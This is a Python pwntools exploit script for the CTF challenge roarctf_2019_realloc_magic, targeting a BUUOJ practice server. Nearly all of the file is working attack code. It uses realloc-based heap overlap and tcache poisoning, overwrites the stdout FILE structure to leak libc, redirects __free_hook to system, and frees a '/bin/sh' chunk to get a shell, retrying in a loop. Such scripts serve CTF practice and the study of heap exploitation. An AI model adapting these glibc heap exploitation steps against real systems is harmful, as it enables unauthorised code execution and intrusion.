#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/06/06 18:02:31
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
# context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('roarctf_2019_realloc_magic')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    IP = 'node3.buuoj.cn'
    port = 26270
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/18-64-libc-2.27.so')
elf = ELF('roarctf_2019_realloc_magic')

def cmd(choice):
    sh.recvuntil(">> ")
    sh.sendline(str(choice))

def realloc(size,content):
    cmd(1)
    sh.recvuntil("Size?\n")
    sh.sendline(str(size))
    sh.recvuntil("Content?\n")
    sh.send(content)
def back():
	sh.recvuntil(">> ")
	sh.sendline('666')

def delete():
    cmd(2)

def pwn():
    realloc(0x70,'a')
    realloc(0,'')
    realloc(0x100,'b')
    realloc(0,'')
    realloc(0xa0,'c')
    realloc(0,'')

    realloc(0x100,'b')
    [delete() for i in range(7)] #fill tcache
    realloc(0,'') #to unsortbin fd->arena
    realloc(0x70,'a')
    realloc(0x180,'c'*0x78+p64(0x101)+p8(0x60)+p8(0x87))#overlap

    realloc(0,'')
    realloc(0x100,'a')
    realloc(0,'')
    realloc(0x100,p64(0xfbad3887)+p64(0)*3+p8(0x58))#get _IO_2_1_stdout_  change flag and write_base

    #get_libc
    libc_base = u64(sh.recvuntil("\x7f",timeout=0.1)[-6:].ljust(8,'\x00'))-0x3e82a0 # _IO_2_1_stderr_+216 store _IO_file_jumps
    if libc_base == -0x3e82a0:
        exit(-1)
    log.info("Success leak libc_base:0x%x"%libc_base)
    free_hook=libc_base+libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    one_gadget=libc_base + 0x4f322 

    sh.sendline('666')
    realloc(0x120,'a')
    realloc(0,'')
    realloc(0x130,'a')
    realloc(0,'')
    realloc(0x170,'a')
    realloc(0,'')

    realloc(0x130,'a')
    [delete() for i in range(7)]
    realloc(0,'')

    realloc(0x120,'a')
    realloc(0x260,'a'*0x128+p64(0x41)+p64(free_hook-8))
    realloc(0,'')
    realloc(0x130,'a')
    realloc(0,'')
    realloc(0x130,'/bin/sh\x00'+p64(system))
    delete()
    sh.interactive()

if __name__ == '__main__':
    while True:
        sh = remote("node3.buuoj.cn", 26270)
        try:
            pwn()
        except:
            sh.close()